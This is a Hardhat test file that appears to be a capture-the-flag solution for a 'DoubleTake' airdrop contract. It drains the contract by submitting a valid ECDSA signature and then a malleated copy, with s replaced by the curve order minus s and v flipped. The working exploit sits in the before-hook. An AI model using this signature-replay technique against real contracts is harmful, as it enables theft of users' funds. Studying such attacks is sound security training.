const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "DoubleTake";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value: ethers.utils.parseEther("2") });

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));

            // claim your first Ether
            const v = 28;
            const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
            const s = "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";

            const num = new ethers.BigNumber.from("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141")

            const big_r = new ethers.BigNumber.from("0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7")
            const big_s = new ethers.BigNumber.from("0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69")
            const sub_num = num.sub(big_s)

            await victimContract
                .connect(attackerWallet)
                .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), v, r, s);

            await victimContract
                .connect(attackerWallet)
                .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), 27, r, sub_num._hex);
        });

        it("conduct your attack here", async function () {});

        after(async function () {
            expect(await ethers.provider.getBalance(victimContract.address)).to.equal(0, "victim contract is drained");
        });
    });
});

// 11579208923731619542357098500868790785283756427907490438260516314151816149433
// 11579208923731619542357098500868790785283756427907490438260516314151816149433
// 5789604461865897711785492504343953926418782139537452191302581570759080747165
